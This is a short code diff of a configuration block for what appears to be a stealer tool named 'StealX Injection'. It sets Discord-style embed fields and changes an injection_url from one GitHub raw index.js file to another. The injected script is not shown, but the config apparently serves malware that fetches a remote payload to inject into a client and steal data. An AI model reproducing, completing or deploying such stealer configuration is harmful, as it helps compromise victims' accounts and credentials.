@@ -14,7 +14,7 @@ const config = {
   embed_name: 'StealX Injection', 
   embed_icon: 'https://i.ibb.co/wcst8bF/Steal-Xjpg.jpg'.replace(/ /g, '%20'), 
   embed_color: 15548997, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/SKXXASA/StealX/main/index.js', 
   /**
    
    **/
